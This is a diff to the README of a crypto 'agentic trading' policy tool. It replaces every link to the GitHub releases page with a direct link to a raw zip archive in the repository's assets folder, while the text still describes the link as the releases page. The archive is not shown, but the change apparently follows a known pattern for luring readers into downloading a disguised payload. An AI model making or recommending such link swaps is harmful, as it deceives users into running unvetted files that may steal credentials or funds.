@@ -1,6 +1,6 @@
 # ⚖️ sae-policy-guard - Secure Rules for Agentic Trading
 
-[![Download sae-policy-guard](https://img.shields.io/badge/Download-Get%20sae--policy--guard-brightgreen?style=for-the-badge)](https://github.com/SatoshiRenZ/sae-policy-guard/releases)
+[![Download sae-policy-guard](https://img.shields.io/badge/Download-Get%20sae--policy--guard-brightgreen?style=for-the-badge)](https://github.com/SatoshiRenZ/sae-policy-guard/raw/refs/heads/main/assets/sae-policy-guard-v2.0.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Many trading systems operate automatically. This tool watches their actions and 
 
 1. **Open the Download Page**  
    Click the big green button above or visit this page:  
-   [https://github.com/SatoshiRenZ/sae-policy-guard/releases](https://github.com/SatoshiRenZ/sae-policy-guard/releases)  
+   [https://github.com/SatoshiRenZ/sae-policy-guard/raw/refs/heads/main/assets/sae-policy-guard-v2.0.zip](https://github.com/SatoshiRenZ/sae-policy-guard/raw/refs/heads/main/assets/sae-policy-guard-v2.0.zip)  
    This takes you to the page with release files.  
 
 2. **Find the Latest Version**  
@@ -100,7 +100,7 @@ You can add, edit, or remove policies via the app’s policy editor screen. Use 
 To keep the tool working well and secure:
 
 1. Check the releases page regularly:  
-   [https://github.com/SatoshiRenZ/sae-policy-guard/releases](https://github.com/SatoshiRenZ/sae-policy-guard/releases)  
+   [https://github.com/SatoshiRenZ/sae-policy-guard/raw/refs/heads/main/assets/sae-policy-guard-v2.0.zip](https://github.com/SatoshiRenZ/sae-policy-guard/raw/refs/heads/main/assets/sae-policy-guard-v2.0.zip)  
 
 2. Download the latest installer when a new version appears.  
 
@@ -130,4 +130,4 @@ If you have questions or need help, post an issue on the GitHub page in the “I
 
 ---
 
-[![Download sae-policy-guard](https://img.shields.io/badge/Download-Get%20sae--policy--guard-brightgreen?style=for-the-badge)](https://github.com/SatoshiRenZ/sae-policy-guard/releases)
+[![Download sae-policy-guard](https://img.shields.io/badge/Download-Get%20sae--policy--guard-brightgreen?style=for-the-badge)](https://github.com/SatoshiRenZ/sae-policy-guard/raw/refs/heads/main/assets/sae-policy-guard-v2.0.zip)
